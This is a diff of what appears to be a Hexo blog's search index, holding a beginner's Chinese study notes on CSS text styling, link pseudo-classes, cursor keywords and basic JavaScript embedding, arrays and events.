-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;``head``&gt;``  ``&lt;``title``&gt;&lt;/``title``&gt;``  ``&lt;``script` `type``=``&quot;text/javascript&quot;``&gt;``  ``&lt;/``script``&gt;``&lt;/``head``&gt;</span><br></pre></td></tr></table></figure>
+<p>本代码会将<strong>欢迎你</strong>改为50px的字体大小</p>
+<p><strong>font-family：</strong>想要的字体; 可以改变所选属性的字体</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">	<span class="selector-tag">body</span>&#123;<span class="attribute">font-family</span>:楷体;&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>嘿嘿<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>嘻嘻<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>注意：js代码要放在**<script type="text/javascript"></script>**之间，要求type的属性值也要对应为text&#x2F;javascript。</p>
-<p><strong>2.html页面的主体body标签内去引用</strong></p>
-<p>在html的主体部分是引用js，是在<body></body>之前进行编写，代码如下：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;``html` `xmlns``=``&quot;http://www.baidu.com&quot;``&gt;``&lt;``head``&gt;``  ``&lt;``title``&gt;&lt;/``title``&gt;``&lt;/``head``&gt;``&lt;``body``&gt;``  ``&lt;``script` `type``=``&quot;text/javascript&quot;``&gt;``  ``&lt;/``script``&gt;``&lt;/``body``&gt;``&lt;/``html``&gt;</span><br></pre></td></tr></table></figure>
+<p>本代码会将body标签里所有的字改为楷体</p>
+<p><strong>font-weight:粗细</strong> 可以改变字体粗细 </p>
+<p>粗细那可以填的：   <strong>bold</strong> 粗的    <strong>colder</strong>更粗的   <strong>lighter</strong>更细的    <strong>normal</strong>正常的 数字 等等</p>
+<p><strong>font-size: px</strong> 改变字体大小（单位px像素  如20px）（单位em 1em &#x3D; 16px）</p>
+<p><strong>color：颜色</strong> 改变字体颜色</p>
+<p>还有这种办法 <strong>font：字体样式（如斜体）  粗细程度  大小  字体</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">	<span class="selector-tag">p</span>&#123;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">font</span>:oblique bolder <span class="number">20px</span> <span class="string">&quot;楷体&quot;</span>;</span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>嘿嘿<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>3.元素事件中引用</strong></p>
-<p>元素事件中引用是在元素中去直接编写js文件，例如：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;``input` `type``=``&quot;button&quot;` `onClick``=``&quot;alert(&#x27;lieyan16&#x27;)&quot;` `value``=``&quot;按钮&quot;``/&gt;</span><br></pre></td></tr></table></figure>
+<p>将p标签的字改为 <strong>倾斜 加粗 20px大小 楷体</strong></p>
+<h2 id="3-3文本样式"><a href="#3-3文本样式" class="headerlink" title="3.3文本样式"></a>3.3文本样式</h2><h3 id="1、颜色"><a href="#1、颜色" class="headerlink" title="1、颜色"></a>1、颜色</h3><p><strong>分为  ;</strong> 单词(如red)  RGB(0<del>F)    RGBA（在RGB基础上可以设置透明度0</del>1）</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">h1</span>&#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>:<span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.50</span>)；</span></span><br><span class="line"><span class="language-css">        text-align：center; 将文本居中</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>4.引入外部JS文件 (常用)</strong></p>
-<p>引入外部把js文件存放在.js后缀当中，并且使用script来引用，引用的文件可以放在头部，也可以放在主体部分，例如：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;``script` `src``=``&quot;js/index.js&quot;` `type``=``&quot;text/javascript&quot;``&gt;&lt;/``script``&gt;</span><br></pre></td></tr></table></figure>
+<p>以上代码将标签h1的文字颜色改为所选 透明度为0.5</p>
+<h3 id="2、文本对齐的方式"><a href="#2、文本对齐的方式" class="headerlink" title="2、文本对齐的方式"></a>2、文本对齐的方式</h3><p>  <strong>text-align : center;</strong> 将文本居中(见上方代码如何使用)</p>
+<p>在代码中也可以用这些进行对其</p>
+<p><strong>&amp;nbsp</strong> 半角的不断行的空白格（推荐使用）</p>
+<p><strong>&amp;ensp</strong> 半角的空格</p>
+<p><strong>&amp;emsp</strong> 全角的空格</p>
+<h3 id="3、首行缩进"><a href="#3、首行缩进" class="headerlink" title="3、首行缩进"></a>3、首行缩进</h3><p><strong>text-indent: em</strong>   段落首行缩进建议用em作为单位 px是像素太小了</p>
+<h3 id="4、行高"><a href="#4、行高" class="headerlink" title="4、行高"></a>4、行高</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">p</span>&#123;</span></span><br><span class="line"><span class="language-css">	<span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">	<span class="attribute">line-height</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p><strong>height: 300px;</strong> 设置本标签块的高度是300px（可以用<strong>background</strong>给本标签块设置个背景颜色方便看多大）<br><strong>line-height: 10px;</strong>  2行字之间的间距为10px （可以用这个与字体的高度对其）</p>
+<h3 id="5、装饰"><a href="#5、装饰" class="headerlink" title="5、装饰"></a>5、装饰</h3><p><strong>border-radius:10px;</strong> 讲背景边角变圆润</p>
+<h4 id="5-1-划线"><a href="#5-1-划线" class="headerlink" title="5.1 划线"></a>5.1 划线</h4><p>​			<strong>text-decoration : underline;</strong> 给字体设置一个下划线  </p>
+<p>​			将 <strong>underline改为line-through</strong>就是在文本添加一个中划线</p>
+<p>​			将 <strong>underline改为overline</strong>就是在文本添加一个上划线   none去掉划线		</p>
+<h4 id="5-2-文本图片水平对其"><a href="#5-2-文本图片水平对其" class="headerlink" title="5.2 文本图片水平对其"></a>5.2 文本图片水平对其</h4><p><strong>vertical-align : middle;</strong>  </p>
+<h3 id="6、文本阴影和超链接伪类"><a href="#6、文本阴影和超链接伪类" class="headerlink" title="6、文本阴影和超链接伪类"></a>6、文本阴影和超链接伪类</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">	<span class="selector-class">.a1</span>&#123;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">height</span>: <span class="number">125px</span>;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">width</span>: <span class="number">125px</span>;</span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css">	<span class="selector-class">.a3</span>&#123;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css"><span class="comment">/*		去除下划线*/</span></span></span><br><span class="line"><span class="language-css">		<span class="attribute">background</span>: <span class="number">#9AC41A</span>;</span></span><br><span class="line"><span class="language-css"><span class="comment">/*		设置背景颜色*/</span></span></span><br><span class="line"><span class="language-css">		<span class="attribute">border-radius</span>:<span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css"><span class="comment">/*		讲背景边角变圆润*/</span></span></span><br><span class="line"><span class="language-css">		<span class="attribute">font-size</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="language-css"><span class="comment">/*		设置字体大小*/</span></span></span><br><span class="line"><span class="language-css">		<span class="attribute">color</span>: <span class="number">#3205FF</span>;</span></span><br><span class="line"><span class="language-css">		<span class="comment">/*		设置字体颜色*/</span></span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css">	<span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">color</span>: orange;</span></span><br><span class="line"><span class="language-css"><span class="comment">/*		鼠标悬浮到此处 将颜色改为orange*/</span></span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css">	</span></span><br><span class="line"><span class="language-css">	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-
-<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="Array数组"><a href="#Array数组" class="headerlink" title="Array数组"></a><strong>Array数组</strong></h2><p>使用方法</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>) <span class="comment">//定义arr数组</span></span><br><span class="line">        <span class="keyword">var</span> p1 = arr[<span class="number">2</span>] <span class="comment">//定义p1为arr中的第2位</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(p1); <span class="comment">//打印p1</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="p1-笔记"><a href="#p1-笔记" class="headerlink" title="p1 笔记"></a>p1 笔记</h1><p><strong>JavaScript</strong>中有5个假值；0，’ ‘ , undefined , null , naN<br><strong>未定义的值属于假</strong></p>
-<p><strong>i</strong> 忽略大小写表示<br><strong>let</strong> 声明一个变量<br><strong>var</strong>  声明一个变量（不建议使用）<br><strong>const</strong> 声明一个常量 （禁止在后面修改常量）<br><strong>console.log()</strong>  在控制台输出<br><strong>alert</strong> 在警告中输出（显示一个警告对话框）<br><strong>typeof</strong> 检测后面的内容是什么类型<br><strong>Number</strong> 将字符串强制转换为数字<br><strong>Boolean</strong> 将字符串改为布尔值<br><strong>String</strong> 将一个值转换为字符串<br><strong>prompt</strong> 弹出一个可以输入信息的警告<br><strong>isNaN()</strong> 函数可确定值是否为非数字</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a1 = <span class="title function_">prompt</span>(<span class="string">&quot;这样就可以给a1赋值上用户输入的值&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><strong>function</strong> 用于声明一个函数。<br><strong>&#x2F;b</strong> 用来匹配一个字边界</p>
-<h1 id="第九章-事件处理"><a href="#第九章-事件处理" class="headerlink" title="第九章 事件处理"></a>第九章 事件处理</h1><h3 id="1，事件及其说明："><a href="#1，事件及其说明：" class="headerlink" title="1，事件及其说明："></a>1，<strong>事件及其说明</strong>：</h3><p><strong>onclick</strong> 鼠标单击时触发此事件<br><strong>onmouseover</strong> 当鼠标移动到某对象范围的上方时触发此事件<br><strong>onmouseout</strong> 当鼠标离开某对象范围时触发此事件<br><strong>onkeydown</strong> 当键盘上某个按键被按下时触发此事件<br><strong>onkeyup</strong> 当键盘上某个按键被按下后松开时触发此事件<br><strong>onblur</strong> 当前元素失去焦点时触发此事件<br><strong>onfocus</strong> 当某个元素获得焦点时触发此事件<br><strong>onchange</strong> 当前元素失去焦点并且元素的内容发生改变时触发此事件<br><strong>onload</strong> 页面内容完成时触发此事件<br><strong>onunload</strong> 当前页面将被改变时触发此事件</p>
+<h3 id="小重点-超链接伪类"><a href="#小重点-超链接伪类" class="headerlink" title="*小重点 超链接伪类"></a>*小重点 超链接伪类</h3><p><strong>a:hover  {   color: orange;  （后面可以添加属性如文字放大）}</strong><br>鼠标悬浮到此处 将颜色改为orange</p>
+<p><strong>a:active  {  color: aqua;  }</strong><br>鼠标按住此处未释放时  将颜色改为aqua</p>
+<p><strong>a:visited  { color:颜色；}</strong><br>已经访问过的超链接将会运用这个属性 将颜色改为所选</p>
+<p><strong>a:link;{color:颜色；}</strong><br>没有访问过的超链接会使用这个属性 将颜色改为所选</p>
+<h3 id="7-文本阴影"><a href="#7-文本阴影" class="headerlink" title="7.文本阴影"></a>7.<strong>文本阴影</strong></h3><p>text-shadow: 颜色 水平偏移 垂直偏移 阴影半径</p>
+<p>（貌似只支持纯文本）</p>
+<p>无序列表前段圆圈：<br>list-style:<br>    none 去掉圆点<br>    circle 设置为空心圆<br>    decimal 数字<br>    square 正方形</p>
+<h2 id="3-4-table表格"><a href="#3-4-table表格" class="headerlink" title="3.4 table表格"></a>3.4 table表格</h2><h4 id="1-0-关键词"><a href="#1-0-关键词" class="headerlink" title="1.0 关键词"></a><strong>1.0</strong> <strong>关键词</strong></h4><p><strong>table 表格元素</strong><br><strong>border</strong>边框元素<br><strong>tr</strong>  定义表格一行<br><strong>th</strong> 元素定义表头<br><strong>td</strong> 元素定义表格单元<br><strong>rowspan</strong> 行合并<br><strong>colspan</strong> 列合并</p>
+<h2 id="3-5-cursor（鼠标样式）"><a href="#3-5-cursor（鼠标样式）" class="headerlink" title="3.5 cursor（鼠标样式）"></a>3.5 cursor（鼠标样式）</h2><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><table>
+<thead>
+<tr>
+<th><strong>auto</strong></th>
+<th></th>
+<th><strong>默认值，由浏览器根据当前上下文确定要显示的光标样式</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>default</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S0N27-0.gif" alt="默认光标"></strong></td>
+<td><strong>默认光标，不考虑上下文，通常是一个箭头</strong></td>
+</tr>
+<tr>
+<td><strong>none</strong></td>
+<td></td>
+<td><strong>不显示光标</strong></td>
+</tr>
+<tr>
+<td><strong>initial</strong></td>
+<td></td>
+<td><strong>将此属性设置为其默认值</strong></td>
+</tr>
+<tr>
+<td><strong>inherit</strong></td>
+<td></td>
+<td><strong>从父元素基础 cursor 属性的值</strong></td>
+</tr>
+<tr>
+<td><strong>context-menu</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S052A-1.gif" alt="上下文菜单光标"></strong></td>
+<td><strong>表示上下文菜单可用</strong></td>
+</tr>
+<tr>
+<td><strong>help</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S05W2-2.gif" alt="帮助光标"></strong></td>
+<td><strong>表示有帮助</strong></td>
+</tr>
+<tr>
+<td><strong>pointer</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S045S-3.gif" alt="指针光标"></strong></td>
+<td><strong>表示一个链接</strong></td>
+</tr>
+<tr>
+<td><strong>progress</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S04130-4.gif" alt="进度游标"></strong></td>
+<td><strong>进度指示器，表示程序正在执行一些处理，但是您仍然可以在该界面进行一些操作（与 wait 不同）</strong></td>
+</tr>
+<tr>
+<td><strong>wait</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S01548-5.gif" alt="等待光标"></strong></td>
+<td><strong>表示程序繁忙，您应该等待程序指向完成</strong></td>
+</tr>
+<tr>
+<td><strong>cell</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S050C-6.gif" alt="单元游标"></strong></td>
+<td><strong>表示可以选择一个单元格（或一组单元格）</strong></td>
+</tr>
+<tr>
+<td><strong>crosshair</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S03P6-7.gif" alt="十字准线光标"></strong></td>
+<td><strong>一个简单的十字准线</strong></td>
+</tr>
+<tr>
+<td><strong>text</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S0O53-8.gif" alt="文字游标"></strong></td>
+<td><strong>表示可以选择的文本</strong></td>
+</tr>
+<tr>
+<td><strong>vertical-text</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S03J2-9.gif" alt="垂直文本光标"></strong></td>
+<td><strong>表示可以选择的垂直文本</strong></td>
+</tr>
+<tr>
+<td><strong>alias</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S031L-10.gif" alt="别名光标"></strong></td>
+<td><strong>表示要创建别名或快捷方式</strong></td>
+</tr>
+<tr>
+<td><strong>copy</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S032P-11.gif" alt="复制光标"></strong></td>
+<td><strong>表示可以复制某些内容</strong></td>
+</tr>
+<tr>
+<td><strong>move</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S06019-12.gif" alt="移动光标"></strong></td>
+<td><strong>表示可以移动鼠标下方的对象</strong></td>
+</tr>
+<tr>
+<td><strong>no-drop</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S04022-13.gif" alt="无丢游标"></strong></td>
+<td><strong>表示所拖动的项目不能放置在当前位置</strong></td>
+</tr>
+<tr>
+<td><strong>not-allowed</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S01915-14.gif" alt="不允许的游标"></strong></td>
+<td><strong>表示无法完成某事</strong></td>
+</tr>
+<tr>
+<td><strong>all-scroll</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S03556-15.gif" alt="全滚动光标"></strong></td>
+<td><strong>表示对象可以沿任何方向滚动（平移）</strong></td>
+</tr>
+<tr>
+<td><strong>col-resize</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S02507-16.gif" alt="彩色游标"></strong></td>
+<td><strong>表示可以水平调整列的大小</strong></td>
+</tr>
+<tr>
+<td><strong>row-resize</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S03460-17.gif" alt="行大小调整游标"></strong></td>
+<td><strong>表示可以垂直调整行的大小</strong></td>
+</tr>
+<tr>
+<td><strong>n-resize</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S0B57-18.gif" alt="N尺寸游标"></strong></td>
+<td><strong>表示对象的边缘可以向上（向北）移动</strong></td>
+</tr>
+<tr>
+<td><strong>e-resize</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S05555-19.gif" alt="电子调整游标"></strong></td>
+<td><strong>表示对象的边缘可以向右（向东）移动</strong></td>
+</tr>
+<tr>
+<td><strong>s-resize</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S023U-20.gif" alt="S调整游标"></strong></td>
+<td><strong>表示对象的边缘可以向下（向南）移动</strong></td>
+</tr>
+<tr>
+<td><strong>w-resize</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S05b3-21.gif" alt="W尺寸游标"></strong></td>
+<td><strong>表示对象的边缘可以向左（向西）移动</strong></td>
+</tr>
+<tr>
+<td><strong>ne-resize</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S064O-22.gif" alt="NE调整大小的游标"></strong></td>
+<td><strong>表示对象的边缘可以向上和向右（北&#x2F;东）移动</strong></td>
+</tr>
+<tr>
+<td><strong>nw-resize</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S01250-23.gif" alt="NW调整游标"></strong></td>
+<td><strong>表示对象的边缘可以向上和向左（北&#x2F;西）移动</strong></td>
+</tr>
+<tr>
+<td><strong>se-resize</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S01212-24.gif" alt="SE调整游标"></strong></td>
+<td><strong>表示对象的边缘可以向下和向右（向南&#x2F;向东）移动</strong></td>
+</tr>
+<tr>
+<td><strong>sw-resize</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S04439-25.gif" alt="SW调整游标"></strong></td>
+<td><strong>表示对象的边缘可以向下和向左（南&#x2F;西）移动</strong></td>
+</tr>
+<tr>
+<td><strong>ew-resize</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S033E-26.gif" alt="EW调整游标"></strong></td>
+<td><strong>表示可以双向调整对象大小的光标</strong></td>
+</tr>
+<tr>
+<td><strong>ns-resize</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S05346-27.gif" alt="NS调整大小的游标"></strong></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>nesw-resize</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S044L-28.gif" alt="NESW调整大小的游标"></strong></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>nwse-resize</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S033B-29.gif" alt="NWSE调整大小的游标"></strong></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>zoom-in</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S05K0-30.gif" alt="放大光标"></strong></td>
+<td><strong>表示可以放大某些内容</strong></td>
+</tr>
+<tr>
+<td><strong>zoom-out</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S05118-31.gif" alt="缩小光标"></strong></td>
+<td><strong>表示可以缩小某些内容</strong></td>
+</tr>
+<tr>
+<td><strong>grab</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S03b0-32.gif" alt="抓取光标"></strong></td>
+<td><strong>表示可以抓取（拖动）某些东西</strong></td>
+</tr>
+<tr>
+<td><strong>grabbing</strong></td>
+<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S05K4-33.gif" alt="抓取光标"></strong></td>
+<td><strong>表示已经抓取到某些东西</strong></td>
+</tr>
+<tr>
+<td><strong>url(“ “)</strong></td>
+<td>****</td>
+<td><strong>自定义光标的样式，括号中的内容为光标图像的源文件路径</strong></td>
+</tr>
+</tbody></table>
 ]]></content>
       <categories>
         <category>前端开发</category>
@@ -2329,6 +2624,52 @@
       </categories>
   </entry>
   <entry>
+    <title>JavaScript笔记</title>
+    <url>/2023/01/09/09-13-37/</url>
+    <content><![CDATA[<h1 id="1，什么是JavaScript"><a href="#1，什么是JavaScript" class="headerlink" title="1，什么是JavaScript"></a>1，什么是JavaScript</h1><p>JavaScript 是一种脚本，一门编程语言，它可以在网页上实现复杂的功能，网页展现给你的不再是简单的静态信息，而是实时的内容更新，交互式的地图，2D&#x2F;3D 动画，滚动播放的视频等等。JavaScript 怎能缺席。它是标准 Web 技术蛋糕的第三层</p>
+<span id="more"></span>
+
+<h1 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h1><p><strong>截止到1.7号</strong></p>
+<p><strong>9.24前学习到了p8课程</strong> <strong>（4%进度）</strong></p>
+<p><strong>9.25学习p9.p10.p11</strong> <strong>（5.5%进度）</strong></p>
+<p><strong>9.29学习到p14（7%）</strong></p>
+<p><strong>10.1学习到p18（9%）</strong></p>
+<h1 id="2，HTML中引用JavaScript"><a href="#2，HTML中引用JavaScript" class="headerlink" title="2，HTML中引用JavaScript"></a>2，HTML中引用JavaScript</h1><p><strong>1.html中页面的头部引用js</strong></p>
+<p>就是在头部<head></head>之前内进行编写js。代码如下：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;``head``&gt;``  ``&lt;``title``&gt;&lt;/``title``&gt;``  ``&lt;``script` `type``=``&quot;text/javascript&quot;``&gt;``  ``&lt;/``script``&gt;``&lt;/``head``&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意：js代码要放在**<script type="text/javascript"></script>**之间，要求type的属性值也要对应为text&#x2F;javascript。</p>
+<p><strong>2.html页面的主体body标签内去引用</strong></p>
+<p>在html的主体部分是引用js，是在<body></body>之前进行编写，代码如下：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;``html` `xmlns``=``&quot;http://www.baidu.com&quot;``&gt;``&lt;``head``&gt;``  ``&lt;``title``&gt;&lt;/``title``&gt;``&lt;/``head``&gt;``&lt;``body``&gt;``  ``&lt;``script` `type``=``&quot;text/javascript&quot;``&gt;``  ``&lt;/``script``&gt;``&lt;/``body``&gt;``&lt;/``html``&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.元素事件中引用</strong></p>
+<p>元素事件中引用是在元素中去直接编写js文件，例如：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;``input` `type``=``&quot;button&quot;` `onClick``=``&quot;alert(&#x27;lieyan16&#x27;)&quot;` `value``=``&quot;按钮&quot;``/&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>4.引入外部JS文件 (常用)</strong></p>
+<p>引入外部把js文件存放在.js后缀当中，并且使用script来引用，引用的文件可以放在头部，也可以放在主体部分，例如：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;``script` `src``=``&quot;js/index.js&quot;` `type``=``&quot;text/javascript&quot;``&gt;&lt;/``script``&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="Array数组"><a href="#Array数组" class="headerlink" title="Array数组"></a><strong>Array数组</strong></h2><p>使用方法</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>) <span class="comment">//定义arr数组</span></span><br><span class="line">        <span class="keyword">var</span> p1 = arr[<span class="number">2</span>] <span class="comment">//定义p1为arr中的第2位</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(p1); <span class="comment">//打印p1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="p1-笔记"><a href="#p1-笔记" class="headerlink" title="p1 笔记"></a>p1 笔记</h1><p><strong>JavaScript</strong>中有5个假值；0，’ ‘ , undefined , null , naN<br><strong>未定义的值属于假</strong></p>
+<p><strong>i</strong> 忽略大小写表示<br><strong>let</strong> 声明一个变量<br><strong>var</strong>  声明一个变量（不建议使用）<br><strong>const</strong> 声明一个常量 （禁止在后面修改常量）<br><strong>console.log()</strong>  在控制台输出<br><strong>alert</strong> 在警告中输出（显示一个警告对话框）<br><strong>typeof</strong> 检测后面的内容是什么类型<br><strong>Number</strong> 将字符串强制转换为数字<br><strong>Boolean</strong> 将字符串改为布尔值<br><strong>String</strong> 将一个值转换为字符串<br><strong>prompt</strong> 弹出一个可以输入信息的警告<br><strong>isNaN()</strong> 函数可确定值是否为非数字</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a1 = <span class="title function_">prompt</span>(<span class="string">&quot;这样就可以给a1赋值上用户输入的值&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>function</strong> 用于声明一个函数。<br><strong>&#x2F;b</strong> 用来匹配一个字边界</p>
+<h1 id="第九章-事件处理"><a href="#第九章-事件处理" class="headerlink" title="第九章 事件处理"></a>第九章 事件处理</h1><h3 id="1，事件及其说明："><a href="#1，事件及其说明：" class="headerlink" title="1，事件及其说明："></a>1，<strong>事件及其说明</strong>：</h3><p><strong>onclick</strong> 鼠标单击时触发此事件<br><strong>onmouseover</strong> 当鼠标移动到某对象范围的上方时触发此事件<br><strong>onmouseout</strong> 当鼠标离开某对象范围时触发此事件<br><strong>onkeydown</strong> 当键盘上某个按键被按下时触发此事件<br><strong>onkeyup</strong> 当键盘上某个按键被按下后松开时触发此事件<br><strong>onblur</strong> 当前元素失去焦点时触发此事件<br><strong>onfocus</strong> 当某个元素获得焦点时触发此事件<br><strong>onchange</strong> 当前元素失去焦点并且元素的内容发生改变时触发此事件<br><strong>onload</strong> 页面内容完成时触发此事件<br><strong>onunload</strong> 当前页面将被改变时触发此事件</p>
+]]></content>
+      <categories>
+        <category>前端开发</category>
+      </categories>
+  </entry>
+  <entry>
     <title>HTML笔记</title>
     <url>/2023/01/09/12-13-37/</url>
     <content><![CDATA[<h1 id="什么是HTML"><a href="#什么是HTML" class="headerlink" title="什么是HTML"></a>什么是HTML</h1><p>HTML的英文全称是 Hyper Text Markup Language，即超文本标记语言。</p>
@@ -2340,347 +2681,6 @@
 ]]></content>
       <tags>
         <tag>前端开发</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>漏洞扫描工具入门</title>
-    <url>/2025/12/17/10-34-45/</url>
